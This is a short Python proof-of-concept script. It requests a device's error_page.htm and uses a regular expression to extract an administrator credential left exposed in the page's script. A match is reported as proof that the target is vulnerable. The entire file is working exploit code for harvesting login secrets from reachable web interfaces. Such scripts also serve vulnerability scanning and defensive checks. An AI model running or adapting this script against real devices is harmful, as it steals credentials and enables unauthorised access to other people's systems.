#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re
import requests

def poc(address):
    url = 'http://{}/error_page.htm'.format(address)
    try:
        resp = requests.get(url)
        creds = re.findall("if\('1' == '0' \|\| '(.+?)' == 'admin'\)", resp.text)
        if len(creds):
            return address, creds  # target is vulnerable
        else:
            return False  # target is not vulnerable
    except requests.RequestException as e:
        return False
    except Exception as e:
        return False